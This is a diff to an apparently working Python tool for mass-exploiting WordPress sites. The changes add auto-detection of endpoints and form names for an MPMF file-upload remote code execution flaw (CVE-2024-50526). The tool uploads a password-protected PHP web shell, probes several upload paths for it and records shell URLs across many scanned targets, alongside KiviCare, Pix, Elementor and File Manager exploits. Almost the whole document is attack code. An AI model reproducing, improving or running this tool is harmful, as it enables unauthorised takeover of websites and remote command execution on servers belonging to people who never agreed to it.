@@ -394,6 +394,104 @@ class WPFileManagerExploit:
             pass
         return False, None
     
+    def detect_mpmf_endpoint_and_form(self, target_url):
+        """
+        Detect MPMF endpoint and form name automatically
+        Returns (endpoint_url, form_name)
+        """
+        print(f"    {CYAN}[*]{RESET} Auto-detecting MPMF endpoint and form name...")
+        
+        base_url = target_url.rstrip('/')
+        
+        # Common MPMF endpoint patterns
+        endpoint_patterns = [
+            '/mpmf-1/',
+            '/mpmf/',
+            '/multi-purpose-multi-forms/',
+            '/wp-content/plugins/multi-purpose-multi-forms/mpmf-1/',
+            '/index.php/mpmf-1/',
+        ]
+        
+        # Common form name patterns
+        form_patterns = [
+            r'name="form_name"\s+value="([^"]+)"',
+            r'form_name["\']\s*:\s*["\']([^"\']+)',
+            r'form_id["\']\s*:\s*["\']([^"\']+)',
+            r'mpmf_form_id["\']\s*:\s*["\']([^"\']+)',
+            r'<input[^>]+name="form_name"[^>]+value="([^"]+)"',
+        ]
+        
+        found_endpoint = None
+        found_form_name = None
+        
+        # Try to find endpoint by checking common paths
+        for pattern in endpoint_patterns:
+            test_url = urljoin(base_url, pattern)
+            try:
+                resp = self.session.get(test_url, timeout=5)
+                if resp.status_code == 200:
+                    # Check if this looks like an MPMF form
+                    if 'mpmf' in resp.text.lower() or 'form_name' in resp.text:
+                        found_endpoint = test_url
+                        print(f"    {GREEN}[+]{RESET} Found MPMF endpoint: {found_endpoint}")
+                        break
+            except:
+                continue
+        
+        # If no endpoint found, try to find any page with MPMF indicators
+        if not found_endpoint:
+            # Try to find MPMF forms on the main page or common pages
+            pages_to_check = [
+                base_url,
+                urljoin(base_url, '/'),
+                urljoin(base_url, '/index.php'),
+                urljoin(base_url, '/wp-content/plugins/multi-purpose-multi-forms/'),
+            ]
+            
+            for page in pages_to_check:
+                try:
+                    resp = self.session.get(page, timeout=5)
+                    if resp.status_code == 200 and 'mpmf' in resp.text.lower():
+                        # Look for form action URL
+                        action_match = re.search(r'<form[^>]+action="([^"]+)"', resp.text)
+                        if action_match:
+                            found_endpoint = action_match.group(1)
+                            print(f"    {GREEN}[+]{RESET} Found MPMF endpoint from form action: {found_endpoint}")
+                            break
+                except:
+                    continue
+        
+        # Now detect form name
+        if found_endpoint:
+            try:
+                resp = self.session.get(found_endpoint, timeout=5)
+                if resp.status_code == 200:
+                    for pattern in form_patterns:
+                        match = re.search(pattern, resp.text, re.IGNORECASE)
+                        if match:
+                            found_form_name = match.group(1)
+                            print(f"    {GREEN}[+]{RESET} Detected form_name: {found_form_name}")
+                            break
+            except:
+                pass
+        
+        # If still no form name, try common values
+        if not found_form_name:
+            common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload', 'default', 'mpmf']
+            for fname in common_forms:
+                if found_endpoint:
+                    test_url = f"{found_endpoint}?form_name={fname}"
+                    try:
+                        resp = self.session.get(test_url, timeout=5)
+                        if resp.status_code == 200 and ('mpmf' in resp.text.lower() or len(resp.text) > 100):
+                            found_form_name = fname
+                            print(f"    {GREEN}[+]{RESET} Found working form name: {found_form_name}")
+                            break
+                    except:
+                        continue
+        
+        return found_endpoint, found_form_name
+    
     def exploit_kivicare_auth_bypass(self, target_url, email, login_type="google"):
         """
         CVE-2026-2991 — KiviCare Clinic & Patient Management System Authentication Bypass
@@ -631,50 +729,77 @@ class WPFileManagerExploit:
         """
         print(f"\n  {CYAN}[*]{RESET} Testing MPMF RCE (CVE-2024-50526)...")
         
-        if not target_url.endswith('/'):
-            target_url += '/'
-        
-        base_parts = target_url.split('/wp-content/')
-        if len(base_parts) > 1:
-            base_url = base_parts[0] + '/'
-        else:
-            base_url = target_url
-        
+        # Auto-detect endpoint and form name if not provided
+        endpoint_url = None
         if not form_name:
-            print(f"    {CYAN}[*]{RESET} No form name provided, attempting to detect...")
-            try:
-                response = self.session.get(target_url, timeout=10)
-                form_patterns = [
-                    r'name="form_name"\s+value="([^"]+)"',
-                    r'form_name["\']\s*:\s*["\']([^"\']+)',
-                    r'form_id["\']\s*:\s*["\']([^"\']+)',
-                ]
-                for pattern in form_patterns:
-                    match = re.search(pattern, response.text)
-                    if match:
-                        form_name = match.group(1)
-                        print(f"    {GREEN}[+]{RESET} Detected form_name: {form_name}")
+            endpoint_url, detected_form = self.detect_mpmf_endpoint_and_form(target_url)
+            if detected_form:
+                form_name = detected_form
+        
+        # If still no endpoint, try common paths
+        if not endpoint_url:
+            base_url = target_url.rstrip('/')
+            common_endpoints = [
+                urljoin(base_url, '/mpmf-1/'),
+                urljoin(base_url, '/mpmf/'),
+                urljoin(base_url, '/index.php/mpmf-1/'),
+                urljoin(base_url, '/wp-content/plugins/multi-purpose-multi-forms/mpmf-1/'),
+            ]
+            for ep in common_endpoints:
+                try:
+                    resp = self.session.get(ep, timeout=5)
+                    if resp.status_code == 200:
+                        endpoint_url = ep
+                        print(f"    {GREEN}[+]{RESET} Found MPMF endpoint: {endpoint_url}")
                         break
-                if not form_name:
-                    common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload']
-                    for fname in common_forms:
-                        test_url = f"{base_url}?form_name={fname}"
-                        test_resp = self.session.get(test_url, timeout=5)
-                        if test_resp.status_code == 200 and 'mpmf' in test_resp.text.lower():
-                            form_name = fname
-                            print(f"    {GREEN}[+]{RESET} Found working form: {form_name}")
+                except:
+                    continue
+        
+        if not endpoint_url:
+            print(f"    {RED}[-]{RESET} Could not find MPMF endpoint")
+            return False, "MPMF endpoint not found"
+        
+        # If still no form name, try to detect from endpoint
+        if not form_name:
+            try:
+                resp = self.session.get(endpoint_url, timeout=5)
+                if resp.status_code == 200:
+                    form_patterns = [
+                        r'name="form_name"\s+value="([^"]+)"',
+                        r'form_name["\']\s*:\s*["\']([^"\']+)',
+                        r'<input[^>]+name="form_name"[^>]+value="([^"]+)"',
+                    ]
+                    for pattern in form_patterns:
+                        match = re.search(pattern, resp.text, re.IGNORECASE)
+                        if match:
+                            form_name = match.group(1)
+                            print(f"    {GREEN}[+]{RESET} Detected form_name: {form_name}")
                             break
             except:
                 pass
+        
+        # Last resort: try common form names
+        if not form_name:
+            common_forms = ['hkh', 'contact', 'form1', 'mpmf_form', 'upload', 'default']
+            for fname in common_forms:
+                print(f"    {CYAN}[*]{RESET} Trying form name: {fname}")
+                # Test if this form name works by checking if the page loads
+                test_url = f"{endpoint_url}?form_name={fname}"
+                try:
+                    resp = self.session.get(test_url, timeout=5)
+                    if resp.status_code == 200 and ('mpmf' in resp.text.lower() or len(resp.text) > 100):
+                        form_name = fname
+                        print(f"    {GREEN}[+]{RESET} Found working form name: {form_name}")
+                        break
+                except:
+                    continue
         
         if not form_name:
             print(f"    {RED}[-]{RESET} Could not detect form_name")
             return False, "Form name not detected"
         
-        if '/mpmf-' in target_url:
-            endpoint_url = target_url
-        else:
-            endpoint_url = urljoin(base_url, 'mpmf-1/')
+        print(f"    {CYAN}[*]{RESET} Endpoint: {endpoint_url}")
+        print(f"    {CYAN}[*]{RESET} Form name: {form_name}")
         
         php_payload = f"""<?php
 $p = "{SHELL_PASSWORD}";
@@ -696,7 +821,7 @@ if (isset($_GET['cmd'])) {{
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
             "Accept-Encoding": "gzip, deflate, br",
-            "Origin": base_url.rstrip('/'),
+            "Origin": target_url.rstrip('/'),
             "DNT": "1",
             "Sec-GPC": "1",
             "Connection": "keep-alive",
@@ -726,6 +851,13 @@ if (isset($_GET['cmd'])) {{
             if response.status_code == 200:
                 print(f"    {GREEN}[+]{RESET} File upload successful!")
                 
+                # Determine base URL for uploads
+                base_parts = target_url.split('/wp-content/')
+                if len(base_parts) > 1:
+                    base_url = base_parts[0] + '/'
+                else:
+                    base_url = target_url.rstrip('/') + '/'
+                
                 shell_url = f"{base_url}wp-content/uploads/mpmf_uploads/cmd.php"
                 print(f"    {CYAN}[*]{RESET} Checking for shell at: {shell_url}")
                 
@@ -739,6 +871,7 @@ if (isset($_GET['cmd'])) {{
                         f"{base_url}wp-content/uploads/cmd.php",
                         f"{base_url}wp-content/uploads/mpmf/cmd.php",
                         f"{base_url}uploads/mpmf_uploads/cmd.php",
+                        f"{base_url}wp-content/plugins/multi-purpose-multi-forms/files/cmd.php",
                     ]
                     for alt_url in alt_paths:
                         if self.verify_shell(alt_url):
@@ -746,6 +879,7 @@ if (isset($_GET['cmd'])) {{
                             return True, f"MPMF Shell: {alt_url}?p={SHELL_PASSWORD}"
                     
                     print(f"    {YELLOW}[!]{RESET} Payload uploaded but shell verification failed")
+                    print(f"    {YELLOW}[!]{RESET} Try accessing: {shell_url}?p={SHELL_PASSWORD}")
                     return True, f"MPMF payload uploaded: {shell_url}?p={SHELL_PASSWORD}"
             else:
                 print(f"    {RED}[-]{RESET} Upload failed with status {response.status_code}")
@@ -1210,9 +1344,9 @@ def scan_vulnerable_plugins(target_url, max_workers=10):
         for future in as_completed(futures):
             try:
                 result = future.result(timeout=3)
-                if result.get('vulnerable', False):
+                if isinstance(result, dict) and result.get('vulnerable', False):
                     results.append(result)
-            except:
+            except Exception as e:
                 continue
     
     return results
@@ -1250,7 +1384,7 @@ def check_plugin_vulnerability(url, plugin_name, keywords=None):
             return {'plugin': plugin_name, 'url': url, 'vulnerable': False}
             
     except Exception as e:
-        return {'plugin': plugin_name, 'url': url, 'vulnerable': False}
+        return {'plugin': plugin_name, 'url': url, 'vulnerable': False, 'error': str(e)}
 
 def check_wordpress_site(base_url):
     wp_indicators = ['wp-content', 'wp-includes', 'wp-admin', 'wp-json']
@@ -1300,12 +1434,16 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
         print(f"{GREEN}[+]{RESET} WordPress detected: {target_url}")
         
         plugin_results = scan_vulnerable_plugins(target_url, max_workers=10)
-        result['vulnerable_plugins'] = plugin_results
+        if isinstance(plugin_results, list):
+            result['vulnerable_plugins'] = plugin_results
+        else:
+            result['vulnerable_plugins'] = []
         
-        if plugin_results:
-            print(f"{YELLOW}[!]{RESET} Found {len(plugin_results)} potentially vulnerable plugins")
-            for plugin in plugin_results[:3]:
-                print(f"  {CYAN}-{RESET} {plugin['plugin']}: {plugin['url']}")
+        if result['vulnerable_plugins']:
+            print(f"{YELLOW}[!]{RESET} Found {len(result['vulnerable_plugins'])} potentially vulnerable plugins")
+            for plugin in result['vulnerable_plugins'][:3]:
+                if isinstance(plugin, dict):
+                    print(f"  {CYAN}-{RESET} {plugin.get('plugin', 'Unknown')}: {plugin.get('url', 'N/A')}")
         
         if exploit:
             exploiter = WPFileManagerExploit()
@@ -1326,7 +1464,7 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
                     result['shell_urls'].append(shell_url)
                 print(f"  {GREEN}[SHELL]{RESET} {pix_msg}")
             
-            # Try MPMF RCE
+            # Try MPMF RCE (with auto-detection)
             print(f"{CYAN}[*]{RESET} Testing MPMF RCE...")
             mpmf_success, mpmf_msg = exploiter.exploit_mpmf_rce(target_url, mpmf_form_name)
             if mpmf_success and "Shell" in mpmf_msg:
@@ -1362,9 +1500,10 @@ def scan_single_target(target_url, exploit=False, elementor_creds=None, interact
             # Try other exploits
             exploit_result = exploiter.auto_exploit(target_url, elementor_creds, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type)
             result['exploit_results'] = exploit_result
-            for shell in exploit_result.get('shell_urls', []):
-                if shell not in result['shell_urls']:
-                    result['shell_urls'].append(shell)
+            if isinstance(exploit_result, dict) and 'shell_urls' in exploit_result:
+                for shell in exploit_result.get('shell_urls', []):
+                    if shell not in result['shell_urls']:
+                        result['shell_urls'].append(shell)
     
     return result
 
@@ -1413,7 +1552,8 @@ def mass_scan_targets(targets, max_workers=30, exploit=False, elementor_creds=No
                         print(f"\n{RED}[VULN]{RESET} {WHITE}{result['url']}{RESET}")
                         print(f"  {YELLOW}Vulnerable Plugins:{RESET} {len(result['vulnerable_plugins'])}")
                         for plugin in result['vulnerable_plugins'][:3]:
-                            print(f"    {CYAN}[+]{RESET} {plugin['plugin']}")
+                            if isinstance(plugin, dict):
+                                print(f"    {CYAN}[+]{RESET} {plugin.get('plugin', 'Unknown')}")
                 
                 results.append(result)
                 
@@ -1488,7 +1628,8 @@ def save_results(results, filename="wp_exploit_results.txt"):
                         f.write(f"Vulnerable Plugins: {len(result['vulnerable_plugins'])}\n")
                         
                         for plugin in result['vulnerable_plugins']:
-                            f.write(f"  - {plugin['plugin']}: {plugin['url']}\n")
+                            if isinstance(plugin, dict):
+                                f.write(f"  - {plugin.get('plugin', 'Unknown')}: {plugin.get('url', 'N/A')}\n")
                         
                         if result['shell_urls']:
                             f.write("\nUPLOADED SHELLS:\n")
@@ -1568,12 +1709,14 @@ def main():
             if username and password:
                 elementor_creds = {'username': username, 'password': password}
     
-    # MPMF form name (optional)
+    # MPMF form name (optional - will auto-detect if not provided)
     mpmf_form_name = None
     if exploit:
         mpmf_form_input = input(f"{YELLOW}[?]{RESET} Enter MPMF form name (or press Enter for auto-detect): ").strip()
         if mpmf_form_input:
             mpmf_form_name = mpmf_form_input
+        else:
+            print(f"  {CYAN}[i]{RESET} MPMF form name will be auto-detected")
     
     # Pix command (optional)
     pix_command = None
@@ -1586,13 +1729,15 @@ def main():
     print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
     if exploit:
         print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED")
-        print(f"{RED}[!]{RESET} Exploits: KiviCare Bypass, Pix for WooCommerce, MPMF, WooCommerce, File Manager, Elementor, Admin Ajax")
+        print(f"{RED}[!]{RESET} Exploits: KiviCare Bypass, Pix for WooCommerce, MPMF (auto-detect), WooCommerce, File Manager, Elementor, Admin Ajax")
         if kivicare_email:
             print(f"{GREEN}[+]{RESET} KiviCare target email: {kivicare_email}")
         if elementor_creds:
             print(f"{GREEN}[+]{RESET} Elementor exploit will be attempted")
         if mpmf_form_name:
             print(f"{GREEN}[+]{RESET} MPMF form name: {mpmf_form_name}")
+        else:
+            print(f"{GREEN}[+]{RESET} MPMF form name will be auto-detected")
         if pix_command:
             print(f"{GREEN}[+]{RESET} Pix command: {pix_command}")
         print(f"{YELLOW}[!]{RESET} Use only on authorized targets")
